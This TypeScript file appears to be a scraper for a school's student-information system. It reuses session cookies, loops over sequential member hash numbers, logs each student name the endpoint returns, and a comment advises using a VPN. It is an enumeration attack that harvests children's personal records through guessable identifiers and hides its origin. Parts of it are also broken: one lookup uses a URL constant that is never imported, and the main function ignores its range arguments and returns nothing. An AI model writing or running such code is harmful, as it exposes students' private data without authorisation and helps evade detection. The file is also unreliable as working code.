import { UserCookies } from "./setup";
import { STUDENT_HASH_URL } from "./urls";
import fetch from 'node-fetch';


export function query(query: string): string {
	return '';
}


interface QueryOutput {
	barcode: string;
	keycode: string;
	name: string;
}
/**
 * Query all the possible barcodes, returns the list of barcode/keycode
 * @param cookies Authentication cookies
 * @param from From number
 * @param to To number
 */
export async function queryAll(cookies: UserCookies, from: number, to: number): Promise<string[]> {
	// get cookies

	// query all the keycodes --- make sure to use an vpn
	for (let i = 80500; i < 80600; ++i) {
		const result = await testMemberHash(cookies, i);
		if (result.StudentName) {
			console.log(`${i}: ${result.StudentName}`);
		} else {
			console.log(`${i}: none`);
		}
	}

	return [];
}

async function testStudentID(cookies: UserCookies, id: number): Promise<any> {
	const response = await sendRequest(STUDENT_ID_URL, cookies, {
		"StudentKey": "",
		"Surname": "",
		"KnownAs": "",
		"GivenName": "",
		"Family": "",
		"CurrentYear": "",
		"Gender": "",
		"Email": "",
		"HomeTeacher": "",
		"MemberHash": id,
		"ShowDeparted": false,
		"Barcode": "",
		"CallHub": true
	});
	const json = await response.json();
	return json.d ? json.d[0] : {};
}

async function testMemberHash(cookies: UserCookies, hash: number): Promise<any> {
	const response = await sendRequest(STUDENT_HASH_URL, cookies, {
		"StudentKey": "",
		"Surname": "",
		"KnownAs": "",
		"GivenName": "",
		"Family": "",
		"CurrentYear": "",
		"Gender": "",
		"Email": "",
		"HomeTeacher": "",
		"MemberHash": ""+hash,
		"ShowDeparted": false,
		"Barcode": "",
		"CallHub": true
	});
	const json = await response.json();

	return json.d ? json.d[0] : {};

}

function sendRequest(url: string, cookies: UserCookies, data: object, type: string = 'POST'): Promise<Response> {
	return fetch(url, {
		method: type,
		headers: {
			'Content-Type': 'application/json',
			'Cookie': Object.keys(cookies).map(key => `${key}=${cookies[key]}`).join('; ')
		},
		body: JSON.stringify(data)
	}) as any;
}
